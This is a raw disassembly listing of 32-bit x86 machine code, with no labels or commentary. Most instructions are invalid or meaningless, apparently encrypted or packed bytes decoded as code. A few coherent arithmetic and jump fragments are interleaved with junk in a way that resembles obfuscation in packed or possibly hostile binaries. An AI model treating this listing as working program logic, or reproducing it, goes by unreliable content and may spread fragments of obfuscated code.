  4020d7:	sub    DWORD PTR [ecx],edx
  4020d9:	lock pop esp
  4020db:	sub    DWORD PTR [ecx-0x6a],edx
  4020de:	or     DWORD PTR [ebp+0x3],0x42
  4020e2:	xlat   BYTE PTR ds:[ebx]
  4020e3:	inc    eax
  4020e4:	sbb    eax,0x50fb03f4
  4020e9:	sub    edi,DWORD PTR [ebx]
  4020eb:	pop    ebp
  4020ec:	sbb    al,0xc7
  4020ee:	(bad)  
  4020ef:	jmp    0x4020dd
  4020f1:	adc    edx,edi
  4020f3:	and    al,0x8e
  4020f5:	dec    edx
  4020f6:	(bad)  
  4020f7:	or     ch,bl
  4020f9:	js     0x402157
  4020fb:	push   edx
  4020fc:	lods   al,BYTE PTR ds:[esi]
  4020fd:	add    BYTE PTR [ebx-0x6a],dl
  402100:	push   ecx
  402101:	cmp    esi,DWORD PTR [ecx+edx*2-0xf2f43b5]
  402108:	clc    
  402109:	xchg   edi,eax
  40210a:	je     0x402134
  40210c:	pushf  
  40210d:	and    dh,cl
  40210f:	ins    DWORD PTR es:[edi],dx
  402110:	loopne 0x402126
  402112:	adc    eax,0xf9978120
  402117:	inc    ebp
  402118:	int    0x2f
  40211a:	jno    0x402148
  40211c:	xor    edi,esp
  40211e:	mov    ds:0x192f1994,al
  402123:	cld    
  402124:	repz push edi
  402126:	call   0x535014a8
  40212b:	push   0x6b
  40212d:	mov    ebx,0xe1153034
  402132:	scas   eax,DWORD PTR es:[edi]
  402133:	push   ebx
  402134:	clc    
  402135:	int3   
  402136:	aaa    
  402137:	and    DWORD PTR [edx],0x72
  40213a:	outs   dx,DWORD PTR ds:[esi]
  40213b:	cmp    eax,0x7d951b4f
  402140:	in     eax,dx
  402141:	pop    ss
  402142:	test   al,0xfc
  402144:	xchg   ecx,eax
  402145:	and    esp,edx
  402147:	adc    dh,BYTE PTR [ebx*8+0x73867c51]
  40214e:	jecxz  0x402122
  402150:	push   esp
  402151:	out    0xa6,al
  402153:	clc    
  402154:	add    al,0x45
  402156:	sbb    bh,0xcf
  402159:	cwde   
  40215a:	sbb    al,0xc8
  40215c:	test   DWORD PTR [esi+ebx*4],ebp
  40215f:	test   eax,0x4bcf8376
  402164:	jecxz  0x40211b
  402166:	pop    ds
  402167:	jmp    0xb2b2f803
  40216c:	in     eax,dx
  40216d:	pop    edi
  40216e:	sahf   
  40216f:	repnz xor BYTE PTR [ebp+0x6b],dh
  402173:	mov    ebx,0x16abc463
  402178:	shl    DWORD PTR [ebp+0x32],cl
  40217b:	(bad)  
  40217d:	test   eax,0xfbac02a9
  402182:	pop    edx
  402183:	cmc    
  402184:	mov    edx,0xae68718a
  402189:	push   ds
  40218a:	cs jle 0x40216d
  40218d:	daa    
  40218e:	add    al,0x3f
  402190:	add    ah,BYTE PTR [ecx-0x212127d3]
  402196:	mov    bl,0x53
  402198:	sub    DWORD PTR [esi],eax
  40219a:	adc    ebp,ecx
  40219c:	imul   eax,DWORD PTR [esi+ecx*1-0x7ab3c702],0x9dbb7155
  4021a7:	xor    eax,0x48ecdb4a
  4021ac:	dec    esi
  4021ad:	mov    fs,WORD PTR [eax-0x10]
  4021b0:	add    eax,0xcd241d4d
  4021b5:	mov    edx,0xc8ed811d
  4021ba:	pop    es
  4021bb:	ret    0x1978
  4021be:	int    0xb
  4021c0:	pop    eax
  4021c1:	dec    edi
  4021c2:	jae    0x4021dc
  4021c4:	outs   dx,BYTE PTR ds:[esi]
  4021c5:	mov    eax,gs:0xa0ecc313
  4021cb:	xor    BYTE PTR [eax],bh
  4021cd:	ja     0x40217b
  4021cf:	xchg   esp,eax
  4021d0:	shl    esp,0x88
  4021d3:	dec    ecx
  4021d4:	fcomp  QWORD PTR ds:[ebp-0x7416160d]
  4021db:	and    BYTE PTR [edx],ah
  4021dd:	das    
  4021de:	xchg   di,ax
  4021e0:	aad    0x4e
  4021e2:	jb     0x4021d6
  4021e4:	icebp  
  4021e5:	pop    esp
  4021e6:	and    eax,0xbcfca2fc
  4021eb:	push   0xffffffd4
  4021ed:	icebp  
  4021ee:	fcomp  QWORD PTR [edx-0x60]
  4021f1:	mov    bl,0x86
  4021f3:	cmp    cl,al
  4021f5:	push   eax
  4021f6:	push   ebp
  4021f7:	stos   BYTE PTR es:[edi],al
  4021f8:	mul    ch
  4021fa:	xchg   DWORD PTR [ebx],eax
  4021fc:	sub    esp,DWORD PTR [esi+esi*2]
  4021ff:	das    
  402200:	mov    WORD PTR [edx],es
  402202:	enter  0x5f56,0x99
  402206:	mov    ds:0xfc8fb714,eax
  40220b:	inc    ebp
  40220c:	mov    esi,0xa07d233
  402211:	push   eax
  402212:	ss jle 0x402213
  402215:	pop    eax
  402216:	mov    BYTE PTR [esi+0x4a80622f],dh
  40221c:	jb     0x4021a5
  40221e:	push   eax
  40221f:	xor    eax,0x971200ef
  402224:	add    al,0x62
  402226:	add    esi,DWORD PTR [ebx+0x8995936]
  40222c:	push   esi
  40222d:	cmp    eax,esi
  40222f:	ret    
  402230:	lds    edx,FWORD PTR [ebp-0x7e]
  402233:	ror    BYTE PTR [edx],0xb5
  402236:	dec    ecx
  402237:	mov    esp,0xd697db10
  40223c:	in     eax,0x75
  40223e:	rol    BYTE PTR [eax-0x9777b9b],0x35
  402245:	mov    ch,0x57
  402247:	mov    ebp,0x64c29340
  40224c:	xchg   DWORD PTR [eax-0x34],ebx
  40224f:	(bad)  
  402250:	sub    al,0x10
  402252:	add    BYTE PTR [ecx-0x6bda5b94],ch
  402258:	jo     0x4021f7
  40225a:	popf   
  40225b:	gs push es
  40225d:	mov    ds:0xe89d8844,eax
  402262:	sar    BYTE PTR [esp+eax*2+0x773acf82],1
  402269:	and    eax,0xb640538d
  40226e:	xor    eax,0x27d5acf9
  402273:	iret   
  402274:	xchg   esp,eax
  402275:	jne    0x402292
  402277:	cmc    
  402278:	mov    dl,BYTE PTR [ebp-0x55afd4c3]
  40227e:	loope  0x402200
  402280:	xor    bl,BYTE PTR [ebx-0x32]
  402283:	retf   0x7a14
  402286:	in     al,0x9b
  402288:	popa   
  402289:	mov    bl,0x16
  40228b:	sti    
  40228c:	gs jb  0x4022e7
  40228f:	mov    ebx,0x9c6452a6
  402294:	adc    eax,0xd4672873
  402299:	push   es
  40229a:	jge    0x4022ab
  40229c:	nop
  40229d:	cmp    ebx,DWORD PTR [edx]
  40229f:	lods   eax,DWORD PTR ds:[esi]
  4022a0:	ja     0x402281
  4022a2:	jl     0x40222d
  4022a4:	shl    BYTE PTR [ebx],cl
  4022a6:	mov    BYTE PTR [ecx+0x42a79125],0x0
  4022ad:	aad    0xa7
  4022af:	inc    edx
  4022b0:	add    BYTE PTR [ebx],al
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a855,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x5682c5b
  4022e1:	or     DWORD PTR [ebx+0x2f],0x78780904
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402274
  4022ed:	lea    eax,[edi+0x25]
  4022f0:	ja     0x40232c
  4022f2:	aam    0x52
  4022f4:	inc    ecx
  4022f5:	rcr    DWORD PTR [ebp+0x7a],cl
  4022f8:	mov    dh,0xa3
  4022fa:	xor    al,0x83
  4022fc:	pop    esi
  4022fd:	mov    al,ds:0xa91299dd
  402302:	add    edi,DWORD PTR fs:[esi+ebp*4+0x5bd5daf6]
  40230a:	mov    ecx,0x3965fec3
  40230f:	scas   al,BYTE PTR es:[edi]
  402310:	cmp    ch,bh
  402312:	(bad)  
  402314:	outs   dx,BYTE PTR ds:[esi]
  402315:	not    dh
  402317:	test   edi,eax
  402319:	sub    DWORD PTR [edi+esi*2-0x30a1d3b8],ebx
  402320:	jns    0x40230a
  402322:	sub    ch,BYTE PTR [eax+0x74]
  402325:	add    eax,0x7fb0a385
  40232a:	sahf   
  40232b:	mov    al,0xb0
  40232d:	jno    0x402377
  40232f:	jecxz  0x402311
  402331:	(bad)  
  402332:	push   ebp
  402333:	mov    eax,ds:0x1e5b32ab
  402338:	or     al,0x88
  40233a:	jo     0x40233d
  40233c:	ror    DWORD PTR [eax],1
  40233e:	jmp    0xa18468c4
  402343:	outs   dx,BYTE PTR ds:[esi]
  402344:	ficomp DWORD PTR [eax-0x7c]
  402347:	(bad)  [ebp-0x6a]
  40234a:	dec    ecx
  40234b:	cdq    
  40234c:	push   0x38ccd883
  402351:	into   
  402352:	jg     0x402313
  402354:	add    DWORD PTR [edx],edx
  402356:	aad    0xd4
  402358:	arpl   WORD PTR [ebp-0x36],bp
  40235b:	stc    
  40235c:	arpl   bx,ax
  40235e:	(bad)  
  40235f:	fcom   st(3)
  402361:	loopne 0x4023c5
  402363:	nop
  402364:	iret   
  402365:	fcmovnu st,st(2)
  402367:	dec    edi
  402368:	in     al,0xf1
  40236a:	jmp    0x4817:0x6e73662a
  402371:	inc    edi
  402372:	rcr    DWORD PTR [ecx],1
  402374:	add    eax,0x93cabd32
  402379:	adc    edi,DWORD PTR [ecx]
  40237b:	and    eax,0xcf6d4c1e
  402380:	stos   BYTE PTR es:[edi],al
  402381:	outs   dx,BYTE PTR ds:[esi]
  402382:	test   DWORD PTR [edi+ecx*2+0x5142d0c0],ebp
  402389:	adc    al,0x4e
  40238b:	stc    
  40238c:	cld    
  40238d:	scas   al,BYTE PTR es:[edi]
  40238e:	mov    al,0xc6
  402390:	sbb    dl,BYTE PTR [ebp-0x38]
  402393:	and    eax,0xa503da70
  402398:	lods   al,BYTE PTR ds:[esi]
  40239a:	ret    
  40239b:	jae    0x40231f
  40239d:	in     al,0xbe
  40239f:	inc    ebx
  4023a0:	mov    bl,0x1f
  4023a2:	(bad)  
  4023a3:	jmp    0x40241b
  4023a5:	popf   
  4023a6:	fild   WORD PTR [ebx-0x2c]
  4023a9:	(bad)  
  4023aa:	or     al,0x2e
  4023ac:	xchg   ecx,eax
  4023ad:	out    dx,eax
  4023ae:	(bad)  
  4023af:	xchg   edi,eax
  4023b0:	push   eax
  4023b1:	add    BYTE PTR [eax+0x60],cl
  4023b4:	push   es
  4023b5:	mov    al,ds:0xeae63ebe
  4023ba:	clts   
  4023bc:	in     al,dx
  4023bd:	into   
  4023be:	jae    0x4023c4
  4023c0:	jb     0x402435
  4023c2:	push   ds
  4023c3:	adc    bp,WORD PTR [ebx-0x6a]
  4023c7:	popa   
  4023c8:	lods   al,BYTE PTR ds:[esi]
  4023c9:	outs   dx,BYTE PTR ds:[esi]
  4023ca:	and    DWORD PTR [esp+esi*1-0x5cf67aa9],esp
  4023d1:	ins    BYTE PTR es:[edi],dx
  4023d2:	ds ins DWORD PTR es:[edi],dx
  4023d4:	test   al,0x17
  4023d6:	sbb    edi,edi
  4023d8:	fcom   QWORD PTR [ecx+0x31]
  4023db:	fldenv [ecx-0x39]
  4023de:	mov    ebp,0x5eaf5eb9
  4023e3:	call   0x1095:0x112f22ff
  4023ea:	aad    0x6
  4023ec:	mov    al,0x4d
  4023ee:	cmp    ecx,DWORD PTR [edi+edi*2]
  4023f1:	or     BYTE PTR [ecx],ch
  4023f3:	arpl   WORD PTR [edx-0x30],si
  4023f6:	mov    eax,ds:0x46e2ac02
  4023fb:	out    0xf3,al
  4023fd:	int    0x9d
  4023ff:	push   edx
  402400:	pop    DWORD PTR [ebp+0x6a]
  402403:	sbb    al,BYTE PTR [edx-0x1a]
  402406:	das    
  402407:	out    0x3e,eax
  402409:	jle    0x4023c2
  40240b:	ss cmc 
  40240d:	enter  0x1b6e,0x1
  402411:	neg    ebp
  402413:	sub    bh,BYTE PTR [eax+0x7]
  402416:	inc    ecx
  402417:	addr16 add al,bh
  40241a:	mov    edi,0xd51b8f70
  40241f:	loop   0x4023ec
  402421:	mov    al,ds:0x96f1c77
  402426:	retf   0xd1fc
  402429:	mov    ebx,0xdec0dd8d
  40242e:	test   DWORD PTR [eax+0x40c177d0],edi
  402434:	mov    ah,0xcc
  402436:	push   edx
  402437:	shr    BYTE PTR [ebx+0x5a],cl
  40243a:	xchg   ebp,eax
  40243b:	and    DWORD PTR [ecx+0xd5619f9],eax
  402441:	cmp    cl,dl
  402443:	push   ecx
  402444:	in     al,0xb
  402446:	sub    esi,DWORD PTR [edi+ebp*8]
  402449:	sbb    DWORD PTR [edx],eax
  40244b:	popa   
  40244c:	icebp  
  40244d:	sub    dl,BYTE PTR [esi-0x7ebdcef6]
  402453:	pushf  
  402454:	std    
  402455:	cld    
  402456:	fwait
  402457:	out    dx,al
  402458:	pop    es
  402459:	and    BYTE PTR [esi*4+0x7864231b],0x85
  402461:	adc    dl,0x58
  402464:	in     al,dx
  402465:	das    
  402466:	jecxz  0x402460
  402468:	rcl    DWORD PTR [edi-0x79c54fef],0x91
  40246f:	jb     0x4023f3
  402471:	nop
  402472:	aam    0xc3
  402474:	cmp    eax,0xc851eca5
  402479:	jbe    0x4024f7
  40247b:	add    DWORD PTR [ecx-0x40116ed8],edi
  402481:	dec    DWORD PTR [eax+0x75c11542]
  402487:	mov    bl,0xb6
  402489:	pusha  
  40248a:	mov    ds:0x648a0377,al
  40248f:	xchg   esi,eax
  402490:	cli    
  402491:	(bad)
  402495:	fsubr  QWORD PTR [ebp-0xd24993d]
  40249b:	and    DWORD PTR [ebx+edi*8+0x79349a76],edx
  4024a2:	mov    ch,0x52
  4024a4:	and    DWORD PTR [ecx+0x72866d35],0xffffffbd
  4024ab:	aad    0x11
  4024ad:	dec    ebp
  4024ae:	add    BYTE PTR [eax-0x76d8ec3b],dl
  4024b4:	cdq    
  4024b5:	rcr    eax,1
  4024b7:	sub    BYTE PTR ss:[edx],bl
  4024ba:	test   al,0x10
  4024bc:	push   cs
  4024bd:	inc    esi
  4024be:	aad    0xb7
  4024c0:	inc    esi
  4024c1:	ja     0x4024a7
  4024c3:	sub    ecx,DWORD PTR [esi-0x2e]
  4024c6:	pusha  
  4024c7:	fcmovnbe st,st(0)
  4024c9:	and    al,0xb0
  4024cb:	cdq    
  4024cc:	inc    ecx
  4024cd:	add    esp,DWORD PTR [edx+0x61]
  4024d0:	int    0x73
  4024d2:	test   eax,0x7c4a1a30
  4024d7:	pop    esi
  4024d8:	mov    edi,ecx
  4024da:	push   edi
  4024db:	xchg   esi,eax
  4024dc:	(bad)  
  4024dd:	pop    edx
  4024de:	mov    al,0x44
  4024e0:	xchg   ebx,eax
  4024e1:	idiv   BYTE PTR [eax+esi*2+0x42]
  4024e5:	loope  0x402512
  4024e7:	fisttp DWORD PTR [ebx+0x5b]
  4024ea:	js     0x40255a
  4024ec:	outs   dx,BYTE PTR ds:[esi]
  4024ed:	mov    dl,BYTE PTR [ebp+edx*8-0x31df4033]
  4024f4:	add    eax,0xbfce0995
  4024f9:	or     eax,DWORD PTR ds:0x368d3dce
  4024ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402500:	jmp    0x346f:0xbe6eca05
  402507:	std    
  402508:	jnp    0x402499
  40250a:	scas   eax,DWORD PTR es:[edi]
  40250b:	mov    BYTE PTR [eax+0x70035177],dh
  402511:	push   ss
  402512:	mov    dh,cl
  402514:	and    eax,0x377eb83b
  402519:	dec    ebp
  40251a:	call   0x8a92d555
  40251f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402520:	rcpps  xmm2,XMMWORD PTR [ebp-0x7e6b02a2]
  402527:	(bad)  
  402528:	mov    WORD PTR [esi],?
  40252a:	mov    esp,0x8aa947a4
  40252f:	clc    
  402530:	sti    
  402531:	mov    ebx,0xbec43234
  402536:	int3   
  402537:	dec    esp
  402538:	imul   ebx,DWORD PTR [ecx+edx*8],0xffffffeb
  40253c:	add    eax,0x1ce35adc
  402541:	add    eax,0x53acbf7b
  402546:	push   ebx
  402547:	sahf   
  402548:	mov    esp,0xded82c67
  40254d:	sub    DWORD PTR [edx+0x7c],esi
  402550:	sbb    esp,DWORD PTR [edi+0x73]
  402553:	mov    ecx,0x18c31791
  402558:	enter  0x8151,0x72
  40255c:	and    dh,0xa1
  40255f:	fisttp QWORD PTR es:[ebx-0x5c]
  402563:	cmp    eax,edx
  402565:	enter  0x62ef,0x49
  402569:	scas   al,BYTE PTR es:[edi]
  40256a:	jle    0x402512
  40256c:	imul   eax,DWORD PTR [esi-0x7af0fec7],0xffffffbc
  402573:	add    al,BYTE PTR [eax]
  402575:	add    BYTE PTR [ebx+0x4d8b0845],cl
  40257b:	lock xor eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	xor    al,0x35
  402595:	loope  0x402590
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x4025f1
  4025a0:	or     eax,DWORD PTR [edx]
  4025a2:	mov    eax,0x244bc67c
  4025a7:	fst    QWORD PTR [eax-0xcb0cdf4]
  4025ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ae:	rcr    BYTE PTR [eax+0x2],cl
  4025b1:	test   al,0x1f
  4025b3:	cs call 0x1b9e:0xbd49fe7d
  4025bb:	mov    ch,0x78
  4025bd:	mov    edi,0xf1bb1ee6
  4025c2:	jl     0x4025d4
  4025c4:	jbe    0x402602
  4025c6:	jg     0x402554
  4025c8:	into   
  4025c9:	shr    DWORD PTR [ebx],1
  4025cb:	or     DWORD PTR [ebx-0x56],ecx
  4025ce:	icebp  
  4025cf:	(bad)  
  4025d0:	stos   BYTE PTR es:[edi],al
  4025d1:	dec    edx
  4025d2:	mov    ebp,0x2df996a9
  4025d7:	adc    al,0x99
  4025d9:	rcr    DWORD PTR [esi+0x423724e4],0xfd
  4025e0:	cmp    ch,0x65
  4025e3:	pop    esp
  4025e4:	cmp    esi,DWORD PTR [ebx-0x3ab1a274]
  4025ea:	add    BYTE PTR [ebx+edi*8],dl
  4025ed:	in     al,dx
  4025ee:	push   eax
  4025ef:	mov    ch,0xd1
  4025f1:	(bad)  
  4025f3:	idiv   DWORD PTR [edx]
  4025f5:	mov    ch,0x46
  4025f7:	int    0x92
  4025f9:	or     DWORD PTR [edx+ebp*4-0x24],edi
  4025fd:	add    ah,BYTE PTR [esi]
  4025ff:	call   0x27b8ece2
  402604:	sahf   
  402605:	xor    cl,bl
  402607:	jne    0x402610
  402609:	mov    edi,0x5616b5de
  40260e:	xchg   ecx,eax
  40260f:	mov    al,ds:0x40d7bdf8
  402614:	push   edx
  402615:	fyl2xp1 
  402617:	mov    ebx,0xde4f9d37
  40261c:	push   ds
  40261d:	jle    0x402604
  40261f:	in     eax,0x89
  402621:	fwait
  402622:	cmp    DWORD PTR [edx+0x60],eax
  402625:	stc    
  402626:	sti    
  402627:	sub    ebp,DWORD PTR [edx]
  402629:	add    bl,0x79
  40262c:	mov    cl,BYTE PTR [ecx-0x3719bc45]
  402632:	jns    0x4025ce
  402634:	scas   eax,DWORD PTR es:[edi]
  402635:	(bad)  
  402636:	shl    BYTE PTR [ecx+0x567dcc4f],0x7e
  40263d:	popa   
  40263e:	out    0x35,eax
  402640:	call   0x98af:0x19223fb
  402647:	leave  
  402648:	xchg   DWORD PTR [edx+0x4e],ebp
  40264b:	out    dx,al
  40264c:	rcl    BYTE PTR [ecx+0xc],cl
  40264f:	pop    esp
  402650:	push   ss
  402651:	add    DWORD PTR [edx],ebp
  402653:	sbb    DWORD PTR [eax+0x66],eax
  402656:	add    esi,DWORD PTR [esi+0x4a]
  402659:	out    0x41,eax
  40265b:	mov    edx,0x252360f3
  402660:	stc    
  402661:	in     al,0xb5
  402663:	sbb    BYTE PTR [eax+0x4656ddea],dh
  402669:	test   BYTE PTR [edi+edi*4-0x78df355e],dh
  402670:	adc    edi,DWORD PTR [edi-0x78]
  402673:	lahf   
  402674:	jnp    0x40261b
  402676:	lahf   
  402677:	out    0x1c,al
  402679:	out    dx,eax
  40267a:	jl     0x402602
  40267c:	data16 and dh,0x74
  402680:	inc    ebp
  402681:	out    0x68,al
  402683:	hlt    
  402684:	cmp    eax,0xd9a9bb1d
  402689:	icebp  
  40268a:	pop    esi
  40268b:	jmp    0x402657
  40268d:	aaa    
  40268e:	mov    WORD PTR [esi],fs
  402690:	(bad)  [esi]
  402692:	and    eax,0x2a2b501e
  402697:	clc    
  402698:	mov    DWORD PTR [eax],edi
  40269a:	or     al,0x34
  40269c:	or     ecx,DWORD PTR [edx+0x31cc6a2d]
  4026a2:	unpckhps xmm1,XMMWORD PTR [esi]
  4026a5:	sbb    DWORD PTR [edi+0x5751fb2d],0x7a
  4026ac:	fdiv   DWORD PTR [eax]
  4026ae:	dec    eax
  4026af:	and    ebx,DWORD PTR [ecx+0x2a3166fa]
  4026b5:	pop    ss
  4026b6:	pop    edi
  4026b7:	mov    al,ds:0x1c928399
  4026bc:	retf   
  4026bd:	xor    eax,0xdefb0327
  4026c2:	(bad)  
  4026c3:	sbb    DWORD PTR [edi-0x5d],ebx
  4026c6:	push   cs
  4026c7:	aad    0x36
  4026c9:	inc    eax
  4026ca:	jo     0x4026fc
  4026cc:	jnp    0x402705
  4026ce:	adc    ah,BYTE PTR [eax+0x1f]
  4026d1:	stc    
  4026d2:	popa   
  4026d3:	addr16 jb 0x402680
  4026d6:	sub    eax,0xa2e221dc
  4026db:	and    cl,BYTE PTR [ecx+0x134798f0]
  4026e1:	mov    cs,WORD PTR [edx-0x63bed875]
  4026e7:	xchg   esi,eax
  4026e8:	dec    edx
  4026e9:	pop    edi
  4026ea:	sub    al,0xc
  4026ec:	loop   0x402754
  4026ee:	jp     0x40267d
  4026f0:	outs   dx,BYTE PTR ds:[esi]
  4026f1:	push   edx
  4026f2:	xchg   ecx,eax
  4026f3:	xor    eax,0x94ccb86e
  4026f8:	cmc    
  4026f9:	imul   ebx,edi,0xffffff84
  4026fc:	js     0x4026ca
  4026fe:	call   0xced8:0x3e26f6cb
  402705:	aas    
  402706:	xchg   edi,eax
  402707:	add    DWORD PTR [edi-0x6e],ecx
  40270a:	jp     0x40272f
  40270c:	dec    eax
  40270d:	add    ebx,DWORD PTR [edi-0xd]
  402710:	hlt    
  402711:	fiadd  WORD PTR [ecx+0x11a0a5fa]
  402717:	sbb    DWORD PTR [edi+0x5b61d4bd],edx
  40271d:	popa   
  40271e:	sub    al,BYTE PTR [esi]
  402720:	or     ebp,DWORD PTR [ebx+0x6]
  402723:	popa   
  402724:	popa   
  402725:	mov    ch,0xd7
  402727:	add    DWORD PTR [edi+0x2acf6781],0x77734e22
  402731:	outs   dx,DWORD PTR ds:[esi]
  402732:	in     al,dx
  402733:	or     BYTE PTR [ebx-0x70],bl
  402736:	vmwrite eax,ecx
  402739:	xchg   ebx,eax
  40273a:	test   edx,edi
  40273c:	aad    0x36
  40273e:	jecxz  0x40271a
  402740:	ret    0x1ac7
  402743:	test   eax,0x885c4805
  402748:	add    bh,dh
  40274a:	inc    ebx
  40274b:	call   0xe794:0x2e356632
  402752:	mov    edx,0x2bd29e14
  402757:	mov    dh,0xc
  402759:	push   esi
  40275a:	push   eax
  40275b:	stc    
  40275c:	push   es
  40275d:	pop    eax
  40275e:	pop    eax
  40275f:	sti    
  402760:	(bad)  
  402761:	mov    bh,0x25
  402763:	mov    ds:0xe6379f0e,eax
  402768:	push   esi
  402769:	cwde   
  40276a:	test   ecx,0x507a58d
  402770:	jmp    0x78aceb28
  402775:	gs jbe 0x40277d
  402778:	adc    al,0xa6
  40277a:	dec    esi
  40277b:	inc    ebx
  40277c:	jnp    0x402703
  40277e:	mov    bh,0x13
  402780:	ret    
  402781:	mov    eax,0x9a01ad03
  402786:	mov    DWORD PTR [ebx-0xc7ec2e7],edi
  40278c:	repnz icebp 
  40278e:	enter  0xd928,0x36
  402792:	retf   0xed3d
  402795:	js     0x4027ae
  402797:	pop    ebx
  402798:	xchg   ecx,eax
  402799:	add    esp,esi
  40279b:	das    
  40279c:	shr    BYTE PTR [ecx],cl
  40279e:	lods   eax,DWORD PTR ds:[esi]
  40279f:	cwde   
  4027a0:	fcomi  st,st(2)
  4027a2:	add    ch,al
  4027a4:	es in  ax,0x61
  4027a8:	pop    ebp
  4027a9:	ret    0x3767
  4027ac:	pop    esi
  4027ad:	jne    0x402758
  4027af:	push   cs
  4027b0:	push   ecx
  4027b1:	or     ch,BYTE PTR [edx+0x77]
  4027b4:	pop    es
  4027b5:	mov    cl,0xfa
  4027b7:	add    al,BYTE PTR [ecx+0x20]
  4027ba:	dec    ebx
  4027bb:	or     ebx,esp
  4027bd:	outs   dx,BYTE PTR ds:[esi]
  4027be:	(bad)  
  4027bf:	xor    BYTE PTR [esi+0x2f1c74fc],ch
  4027c5:	push   esp
  4027c6:	fucomip st,st(0)
  4027c8:	and    DWORD PTR [ecx+0x30],esp
  4027cb:	cmc    
  4027cc:	into   
  4027cd:	mov    esi,0xa01a8300
  4027d2:	lds    ebx,FWORD PTR [edi*2-0x4428a125]
  4027d9:	pop    edx
  4027da:	sub    al,0xf7
  4027dc:	mov    cl,0x4e
  4027de:	pop    edx
  4027df:	out    dx,al
  4027e0:	xchg   ebp,ebp
  4027e2:	cmp    ecx,esi
  4027e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e5:	pop    edx
  4027e6:	jl     0x40279c
  4027e8:	cs push cs
  4027ea:	shl    BYTE PTR [eax-0x68012f2e],1
  4027f0:	aam    0xcf
  4027f2:	test   DWORD PTR [eax],ebp
  4027f4:	pushf  
  4027f5:	in     al,dx
  4027f6:	xor    al,0xce
  4027f8:	test   dl,ah
  4027fa:	clc    
  4027fb:	and    al,0x5d
  4027fd:	sbb    ah,cl
  4027ff:	and    DWORD PTR [edx+0x6c],esp
  402802:	aad    0x24
  402804:	mov    eax,ds:0x11239f39
  402809:	pop    esp
  40280a:	adc    al,0xb9
  40280c:	mov    dl,ah
  40280e:	xchg   edx,eax
  40280f:	xchg   BYTE PTR [ecx],bl
  402811:	(bad)  
  402812:	retf   
  402813:	popf   
  402814:	inc    ebp
  402815:	ins    DWORD PTR es:[edi],dx
  402816:	jo     0x40288d
  402818:	imul   edi,edi,0x7cb08d58
  40281e:	sti    
  40281f:	popf   
  402820:	mov    ax,WORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	cmp    eax,0x848b018
  402886:	or     al,0x78
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028be
  40288e:	xor    BYTE PTR [edi],bl
  402890:	adc    esp,ebp
  402892:	ror    cl,0xc0
  402895:	jle    0x4028e1
  402897:	nop
  402898:	sub    al,0x6c
  40289a:	jg     0x4028e7
  40289c:	push   0xffffffee
  40289e:	sbb    eax,0x51e12eea
  4028a3:	test   bl,ah
  4028a5:	nop
  4028a6:	in     eax,dx
  4028a7:	xor    DWORD PTR [edx+0x38bbc20f],0x59
  4028ae:	xor    cl,BYTE PTR [esi]
  4028b0:	mov    bh,0x2
  4028b2:	pushf  
  4028b3:	sbb    BYTE PTR [edi],dh
  4028b5:	int    0x62
  4028b7:	jp     0x402933
  4028b9:	out    0x91,eax
  4028bb:	jnp    0x40285a
  4028bd:	ins    DWORD PTR es:[edi],dx
  4028be:	or     bh,BYTE PTR [edi+ebx*1]
  4028c1:	shl    cl,0x33
  4028c4:	fidivr WORD PTR [ecx+0x3e1e4ece]
  4028ca:	mov    WORD PTR [ecx-0x59],ds
  4028cd:	inc    edi
  4028ce:	imul   ebp,DWORD PTR [ecx-0x5c978c37],0x3c
  4028d5:	adc    eax,0xae9a7e9
  4028da:	or     DWORD PTR cs:[esi-0x8],ecx
  4028de:	gs pop ebx
  4028e0:	jge    0x4028c1
  4028e2:	jbe    0x4028cc
  4028e4:	cmc    
  4028e5:	cmp    esp,DWORD PTR [ecx]
  4028e7:	fwait
  4028e8:	dec    eax
  4028e9:	sub    DWORD PTR [eax+edi*8-0x26],edi
  4028ed:	add    ch,BYTE PTR [edx-0x21]
  4028f0:	xlat   BYTE PTR ds:[ebx]
